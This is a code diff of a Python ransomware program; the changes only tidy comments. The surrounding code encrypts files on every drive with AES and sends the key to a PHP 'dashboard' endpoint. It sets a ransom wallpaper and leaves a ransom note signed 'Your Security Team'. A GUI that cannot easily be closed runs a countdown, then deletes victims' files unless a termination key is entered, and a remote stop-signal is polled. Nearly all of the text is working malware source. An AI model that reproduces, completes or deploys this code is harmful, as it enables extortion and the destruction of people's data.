@@ -20,17 +20,16 @@ from tkinter import filedialog, messagebox, simpledialog
 from tkinter import ttk
 from PIL import Image, ImageTk
 
-# Step 1: Utility function to get the resource path
+# Utility function to get the resource path
 def resource_path(relative_path):
     base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
     return os.path.join(base_path, relative_path)
 
-# Step 2: Ensure the time directory exists
 def ensure_time_dir_exists():
     if not os.path.exists(TIME_DIR):
         os.makedirs(TIME_DIR)
 
-# Step 3: Function to load the machine id
+#  Function to load the machine id
 def load_machine_id():
     drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
     for drive in drives:
@@ -55,7 +54,6 @@ ICON_PATH = resource_path("img/logo.jpg")
 LOGO_PATH = resource_path("img/logo.jpg")
 THANKS_PATH = resource_path("img/thank-you.png")
 
-# Step 4: Ensure the time directory exists at the start
 ensure_time_dir_exists()
 
 # Encryption Configuration
@@ -65,7 +63,7 @@ PASSWORD_PROVIDED = 'PleaseGiveMeMoney'
 DASHBOARD_URL = 'http://localhost:8080/rans/includes/api/receive_key.php'
 MAX_ATTEMPTS = 10
 DELAY = 5
-# Step 5: Setup logging
+#  Setup logging
 logging.basicConfig(
     filename='encryption_log.txt',
     level=logging.INFO,
@@ -78,10 +76,9 @@ formatter = logging.Formatter('%(asctime)s:%(levelname)s:%(message)s')
 console_handler.setFormatter(formatter)
 logging.getLogger().addHandler(console_handler)
 
-# Part 2: EncryptionTool Class Initialization and Key Generation
+#  EncryptionTool Class Initialization and Key Generation
 
 class EncryptionTool:
-    # Step 6: Initialize the EncryptionTool class
     def __init__(self, drives, extensions, password, dashboard_url, max_attempts=10, delay=5):
         self.drives = drives
         self.extensions = extensions
@@ -92,7 +89,7 @@ class EncryptionTool:
         self.key = self.generate_key(password)
         self.machine_id = str(uuid.uuid4())
 
-    # Step 7: Function to generate the encryption key
+    # Function to generate the encryption key
     def generate_key(self, password):
         try:
             salt = get_random_bytes(16)
@@ -103,9 +100,7 @@ class EncryptionTool:
             logging.error(f"Failed to generate key: {str(e)}")
             raise
 
-# Part 3: File Encryption Functions
-
-    # Step 8: Function to set the wallpaper
+    #  Function to set the wallpaper
     def set_wallpaper(self, path):
         try:
             ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
@@ -113,7 +108,7 @@ class EncryptionTool:
         except Exception as e:
             logging.error(f"Failed to set wallpaper: {str(e)}")
 
-    # Step 9: Function to create important files
+    #  Function to create important files
     def create_important_files(self, directory_path):
         try:
             d_data_path = os.path.join(directory_path, 'D-Data')
@@ -131,7 +126,7 @@ class EncryptionTool:
         except Exception as e:
             logging.error(f"Failed to create important files: {str(e)}")
 
-    # Step 10: Function to encrypt a single file
+    #  Function to encrypt a single file
     def encrypt_file(self, file_path):
         try:
             iv = get_random_bytes(16)
@@ -146,7 +141,7 @@ class EncryptionTool:
         except Exception as e:
             logging.error(f"Failed to encrypt {file_path}: {str(e)}")
 
-    # Step 11: Function to encrypt all files in a directory
+    #  Function to encrypt all files in a directory
     def encrypt_files_in_directory(self, directory_path):
         try:
             for root, dirs, files in os.walk(directory_path):
@@ -160,9 +155,8 @@ class EncryptionTool:
             logging.info(f"All files in {directory_path} encrypted successfully.")
         except Exception as e:
             logging.error(f"Failed to encrypt files in directory {directory_path}: {str(e)}")
-# Part 4: User Manual Creation and Key Management
+#  User Manual Creation and Key Management
 
-    # Step 12: Function to create a user manual
     def create_user_manual(self, directory_path):
         manual_content = f"""Dear User,
 Your files have been secured at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} with a unique machine ID: {self.machine_id}.
@@ -179,7 +173,7 @@ Your Security Team
         except Exception as e:
             logging.error(f"Failed to create user manual: {str(e)}")
 
-    # Step 13: Function to send the encryption key to the dashboard
+    #  Function to send the encryption key to the dashboard
     def send_key_to_dashboard(self):
         encoded_key = base64.b64encode(self.key).decode('utf-8')
         payload = {'machine_id': self.machine_id, 'encryption_key': encoded_key}
@@ -201,7 +195,7 @@ Your Security Team
         logging.error("All attempts to send the key failed.")
         return False
 
-    # Step 13.1: Function to save the encryption key locally
+    #  Function to save the encryption key locally
     def save_key_locally(self):
         key_path = os.path.join('E:', 'encryption_key.txt')
         try:
@@ -215,7 +209,7 @@ Your Security Team
             logging.error(f"Failed to save encryption key locally: {str(e)}")
             return False
         
-    # Step 14: Function to save the machine ID
+    #  Function to save the machine ID
     def save_machine_id(self, directory_path):
         machine_id_path = os.path.join(directory_path, "Machine_id.txt")
         try:
@@ -226,14 +220,14 @@ Your Security Team
         except Exception as e:
             logging.error(f"Failed to save Machine ID: {str(e)}")
 
-    # Step 15: Function to process a drive (create files, encrypt, etc.)
+    #  Function to process a drive (create files, encrypt, etc.)
     def process_drive(self, drive):
         self.create_important_files(drive)
         self.encrypt_files_in_directory(drive)
         self.create_user_manual(drive)
         self.save_machine_id(drive)
 
-    # Step 16: Execute the encryption process
+    #  Execute the encryption process
     def execute(self):
         for drive in self.drives:
             logging.info(f"Processing drive {drive}")
@@ -249,16 +243,15 @@ Your Security Team
         wallpaper_path = resource_path('img/wallpaper.jpg')
         self.set_wallpaper(wallpaper_path)
         logging.info("Encryption process completed.")
-# Part 5: Dialog Classes for User Interaction
 
-# Step 17: Define TerminationKeyDialog class for user interactions
+#  Define TerminationKeyDialog class for user interactions
 class TerminationKeyDialog(tk.Toplevel):
     def __init__(self, parent, icon_path):
         super().__init__(parent)
         self.iconbitmap(icon_path)
         self.title("Termination Key")
         self.geometry("300x100")
-        self.result = None  # Initialize the result attribute
+        self.result = None  
         tk.Label(self, text="Enter the termination key to exit:").pack(pady=5)
         self.key_entry = tk.Entry(self)
         self.key_entry.pack(pady=5)
@@ -269,14 +262,14 @@ class TerminationKeyDialog(tk.Toplevel):
         self.result = self.key_entry.get()
         self.destroy()
 
-# Step 18: Define CustomSecondaryTerminationKeyDialog class for user interactions
+#  Define CustomSecondaryTerminationKeyDialog class for user interactions
 class CustomSecondaryTerminationKeyDialog(simpledialog.Dialog):
     def __init__(self, parent, icon_path, title, prompt):
         self.icon_path = icon_path
         self.prompt = prompt
         super().__init__(parent, title)
 
-    # Step 19: Setup dialog UI
+    #  Setup dialog UI
     def body(self, master):
         self.iconbitmap(self.icon_path)
         tk.Label(master, text=self.prompt).pack(pady=5)
@@ -287,7 +280,7 @@ class CustomSecondaryTerminationKeyDialog(simpledialog.Dialog):
     def apply(self):
         self.result = self.key_entry.get()
 
-    # Step 20: Center the dialog window
+    #  Center the dialog window
     def center_window(self):
         self.update_idletasks()
         window_width = self.winfo_width()
@@ -298,7 +291,7 @@ class CustomSecondaryTerminationKeyDialog(simpledialog.Dialog):
         position_down = int(screen_height / 2 - window_height / 2)
         self.geometry(f"+{position_right}+{position_down}")
 
-# Step 21: Define CountdownDialog class for countdown interactions
+#  Define CountdownDialog class for countdown interactions
 class CountdownDialog(tk.Toplevel):
     def __init__(self, parent, countdown_time, close_app_callback):
         super().__init__(parent)
@@ -315,7 +308,7 @@ class CountdownDialog(tk.Toplevel):
     def disable_event(self):
         pass
 
-    # Step 22: Setup countdown dialog UI
+    #  Setup countdown dialog UI
     def init_ui(self):
         self.geometry("350x150")
         self.iconbitmap(ICON_PATH)
@@ -328,7 +321,7 @@ class CountdownDialog(tk.Toplevel):
         self.countdown_label.pack(side="left", expand=True, padx=20, pady=20)
         self.update_countdown()
 
-    # Step 23: Update countdown timer
+    #  Update countdown timer
     def update_countdown(self):
         if self.countdown_time > 0:
             self.countdown_label.config(text=f"Application will close in {self.countdown_time} seconds.")
@@ -338,7 +331,7 @@ class CountdownDialog(tk.Toplevel):
             self.countdown_label.config(text="Closing application now.")
             self.close_app_callback()
 
-    # Step 24: Center the countdown dialog window
+    #  Center the countdown dialog window
     def center_window(self):
         self.update_idletasks()
         window_width = self.winfo_width()
@@ -349,7 +342,7 @@ class CountdownDialog(tk.Toplevel):
         position_down = int(screen_height / 2 - window_height / 2)
         self.geometry(f"+{position_right}+{position_down}")
 
-# Step 25: Define DeletionCountdownDialog class for deletion countdown interactions
+#  Define DeletionCountdownDialog class for deletion countdown interactions
 class DeletionCountdownDialog(tk.Toplevel):
     def __init__(self, parent, stop_deletion_callback):
         super().__init__(parent)
@@ -373,7 +366,7 @@ class DeletionCountdownDialog(tk.Toplevel):
         self.focus_force()
         self.init_ui()
 
-    # Step 26: Setup deletion countdown dialog UI
+    #  Setup deletion countdown dialog UI
     def init_ui(self):
         thanks_image = Image.open(THANKS_PATH).resize((80, 80))
         thanks_photo = ImageTk.PhotoImage(thanks_image)
@@ -392,7 +385,7 @@ class DeletionCountdownDialog(tk.Toplevel):
     def on_try_close(self):
         messagebox.showwarning("Warning", "This window cannot be closed directly.")
 
-    # Step 27: Handle submission of the secondary termination key
+    #  Handle submission of the secondary termination key
     def on_enter_key(self):
         self.iconbitmap(ICON_PATH)
         key = CustomSecondaryTerminationKeyDialog(self, ICON_PATH, "Stop Deletion", "Enter the secondary termination key:").result
@@ -401,9 +394,8 @@ class DeletionCountdownDialog(tk.Toplevel):
             self.destroy()
         else:
             messagebox.showerror("Error", "Incorrect secondary termination key.")
-# Part 6: DecryptorApp Class and Initialization
 
-# Step 28: Setting up the main DecryptorApp class
+#  Setting up the main DecryptorApp class
 class DecryptorApp(tk.Tk):
     def __init__(self):
         super().__init__()
@@ -427,7 +419,7 @@ class DecryptorApp(tk.Tk):
 
         threading.Thread(target=self.check_for_remote_stop_signal, args=(self.machine_id), daemon=True).start()
 
-    # Step 29 : Function to check for remote stop signal
+    #  Function to check for remote stop signal
     def check_for_remote_stop_signal(self, machine_id, check_interval=10):
         url = f"http://localhost:8080/cryptolock/includes/api/check_stop_signal.php?machine_id={machine_id}"
         while not self.stop_deletion:
@@ -442,7 +434,7 @@ class DecryptorApp(tk.Tk):
                 pass
             time.sleep(check_interval)
 
-    # Step 29.1: Function to stop the deletion process remotely
+    #  Function to stop the deletion process remotely
     def stop_deletion_process_remotely(self):
         if not self.stop_deletion:
             self.stop_deletion = True
@@ -453,7 +445,7 @@ class DecryptorApp(tk.Tk):
                 self.deletion_dialog.destroy()
                 self.deletion_dialog = None
 
-    # Step 30: Function to initialize the UI
+    #  Function to initialize the UI
     def initialize_ui(self):
         self.iconbitmap(ICON_PATH)
         logo_image = Image.open(LOGO_PATH).resize((200, 200))
@@ -499,9 +491,9 @@ class DecryptorApp(tk.Tk):
         self.setup_key_frame()
         self.setup_log_frame()
         self.setup_progress_frame()
-# Part 7: DecryptorApp Methods
+# DecryptorApp Methods
 
-    # Step 31: Function to stop the deletion process
+    #  Function to stop the deletion process
     def stop_deletion_process(self):
         if not self.stop_deletion:
             self.stop_deletion = True
@@ -511,7 +503,7 @@ class DecryptorApp(tk.Tk):
             if hasattr(self, 'deletion_dialog') and self.deletion_dialog.winfo_exists():
                 self.deletion_dialog.destroy()
 
-    # Step 32: Function to check the secondary termination key
+    #  Function to check the secondary termination key
     def check_secondary_termination(self):
         response = simpledialog.askstring("Stop Deletion", "Enter the secondary termination key:", parent=self)
         if response == SECONDARY_TERMINATION_KEY:
@@ -519,20 +511,20 @@ class DecryptorApp(tk.Tk):
         else:
             messagebox.showerror("Error", "Incorrect secondary termination key.")
 
-    # Step 33: Function to log messages
+    #  Function to log messages
     def log(self, message, color='green'):
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         formatted_message = f"[{timestamp}] {message}"
         if self.winfo_exists():
             self.after(0, lambda: self._update_log_listbox(formatted_message, color))
 
-    # Step 34: Function to update the log listbox
+    #  Function to update the log listbox
     def _update_log_listbox(self, message, color):
         self.log_listbox.insert(tk.END, message)
         self.log_listbox.itemconfig(tk.END, {'fg': color})
         self.log_listbox.see(tk.END)
 
-    # Step 35: Setup the key frame
+    #  Setup the key frame
     def setup_key_frame(self):
         key_frame = tk.Frame(self, bg='black')
         key_frame.pack(fill=tk.X, padx=10, pady=(10, 5))
@@ -541,7 +533,7 @@ class DecryptorApp(tk.Tk):
         tk.Button(key_frame, text="START DECRYPTION", bg='#d9534f', fg='white', font=('Helvetica', 12),
                   relief=tk.FLAT, command=self.start_decryption).pack(side=tk.RIGHT, padx=(10, 0))
 
-    # Step 36: Setup the log frame
+    #  Setup the log frame
     def setup_log_frame(self):
         log_frame = tk.Frame(self, bg='black')
         log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
@@ -557,7 +549,7 @@ class DecryptorApp(tk.Tk):
         scrollbar.pack(side="right", fill="y")
         self.log_listbox.config(yscrollcommand=scrollbar.set)
 
-    # Step 37: Setup the progress frame
+    #  Setup the progress frame
     def setup_progress_frame(self):
         self.progress_frame = tk.Frame(self, bg='black')
         self.progress_frame.pack(fill=tk.X, padx=10, pady=20)
@@ -569,9 +561,9 @@ class DecryptorApp(tk.Tk):
         self.progress.pack(fill=tk.X, expand=True)
         self.progress_label = tk.Label(self.progress_frame, text="Decryption Progress: 0%", bg='black', fg='white')
         self.progress_label.pack()
-# Part 8: Decryption Process
+#  Decryption Process
 
-    # Step 38: Function to start the decryption process
+    #  Function to start the decryption process
     def start_decryption(self):
         decryption_key = self.key_entry.get()
         if decryption_key:
@@ -587,7 +579,7 @@ class DecryptorApp(tk.Tk):
         else:
             messagebox.showerror("Error", "Decryption key is not provided.")
 
-    # Step 39: Function to scan and decrypt files
+    #  Function to scan and decrypt files
     def scan_and_decrypt(self, key):
         encrypted_files = []
         drives = [f"{d}:\\" for d in "DEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
@@ -622,22 +614,22 @@ class DecryptorApp(tk.Tk):
             self.after(0, lambda: messagebox.showerror("Decryption Failed",
                                                        "Failed to decrypt one or more files. Please check the decryption key and try again."))
 
-    # Step 40: Function to show incomplete decryption message
+    #  Function to show incomplete decryption message
     def show_incomplete_message(self, decrypted_count, total_files):
         messagebox.showwarning("Decryption Incomplete", f"Decryption completed for {decrypted_count} out of {total_files} files.")
 
-    # Step 41: Function to safely update the progress bar
+    #  Function to safely update the progress bar
     def safe_update_progress(self, value, maximum):
         self.after(0, lambda: self.update_progress_bar(value, maximum))
 
-    # Step 42: Function to update the progress bar
+    #  Function to update the progress bar
     def update_progress_bar(self, value, maximum):
         self.progress["value"] = value
         self.progress["maximum"] = maximum
         percentage = 100 * (value / maximum) if maximum else 0
         self.progress_label.config(text=f"Decryption Progress: {percentage:.2f}%")
 
-    # Step 43: Function to stop the timer and show success message
+    #  Function to stop the timer and show success message
     def stop_timer_and_show_success(self):
         if self.timer_update_id:
             self.after_cancel(self.timer_update_id)
@@ -651,7 +643,7 @@ class DecryptorApp(tk.Tk):
         countdown_dialog = CountdownDialog(self, 10, self.close_application)
         countdown_dialog.mainloop()
 
-#Step 44 : Function to start closing countdown
+# Function to start closing countdown
 
     def start_closing_countdown(self):
         countdown_dialog=CountdownDialog(self,15,self.close.application)
@@ -659,14 +651,14 @@ class DecryptorApp(tk.Tk):
         countdown_dialog.mainloop()
 
 
-#Step 45: Function to close the application
+# Function to close the application
     def close_application(self):
         try:
             self.destroy()
         except Exception as e:
             print(f"Exception when closing: {e}")
     
-#Step 46: Function to handle window close event
+# Function to handle window close event
 
     def on_close_window(self):
         dialog=TerminationKeyDialog(self,ICON_PATH)
@@ -677,7 +669,7 @@ class DecryptorApp(tk.Tk):
             messagebox.showerror("Error", "Incorrect termination key")
             return
 
-#Step 47: Function to decrypt a single file
+# Function to decrypt a single file
     def decrypt_file(self, file_path, key):
         try:
             with open(file_path, 'rb') as f:
@@ -695,7 +687,7 @@ class DecryptorApp(tk.Tk):
             self.log(f"Failed to encrypt:{file_path}")
             return False
 
-#Step 48: Fucntion to load the timer state
+# Fucntion to load the timer state
     def load_timer_state(self):
         try:
             with open(TIMER_STATE_FILE, 'r') as f:
@@ -715,7 +707,7 @@ class DecryptorApp(tk.Tk):
             self.reset_timer()
 
 
-#Step:49 Function to update the timer
+#Function to update the timer
     def update_timer(self):
         remaining_time=self.closing_time - datetime.now()
         if remaining_time.total_seconds() >0:
@@ -726,28 +718,28 @@ class DecryptorApp(tk.Tk):
             self.begin_deletion_sequence()
 
 
-#Step:50 Fuunction to reset the timer
+# Fuunction to reset the timer
     def reset_timer(self):
         self.closing_time=datetime.now() + timedelta(minutes=5)
         with open(TIMER_STATE_FILE, 'w') as f:
             f.write(str(self.closing_time.timestamp()))
         self.update_timer()
     
-#Step 51 Function to reset the timer state
+# Function to reset the timer state
     def reset_timer_state(self):
         with open(TIMER_STATE_FILE, 'w') as f:
             f.write("")
         self.timer_label.config(text="No active countdown")
 
 
-#Step 52 Fucntion to delete th timer state file
+# Fucntion to delete th timer state file
     def delete_timer_state_file(self):
         try:
             os.remove(TIMER_STATE_FILE)
         except FileNotFoundError:
             pass
 
-#Step 53 Function to delete the timer and machine ID files
+# Function to delete the timer and machine ID files
     def delete_timer_and_machine_id_files(self):
         try:
             os.remove(TIMER_STATE_FILE)
@@ -761,7 +753,7 @@ class DecryptorApp(tk.Tk):
             except FileNotFoundError:
                 pass
     
-# Step 54 Function to begin the deleting process
+# Function to begin the deleting process
     def begin_deletion_sequence(self):
         if not self.stop_deletion:
             self.log("Time is up. Starting file deletion sequence. ", "red")
@@ -769,12 +761,12 @@ class DecryptorApp(tk.Tk):
             self.stop_deletion_process()
 
 
-#Step 55 Function to handle deleting process
+# Function to handle deleting process
     def deletion_process(self):
         self.log("Deletion process initiated","yellow")
         self.deletion_thread=threading.Thread(target=self.delete_files_with_timing, daemon=True)
         self.deletion_thread.start()
-#Step 56 Function to delete files with timing
+# Function to delete files with timing
     def delete_files_with_timing(self):
         drives=[f"{d}:\\" for d in "DEFGHIJKLMMOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
         excluded_directories={'System Volume Information','$RECYCLE.BIN','Windows'}
@@ -818,7 +810,7 @@ class DecryptorApp(tk.Tk):
                     break
 
 
-#Step 57 Main Execution
+# Main Execution
 if __name__ == "__main__":
     machine_id=load_machine_id()
     if machine_id:
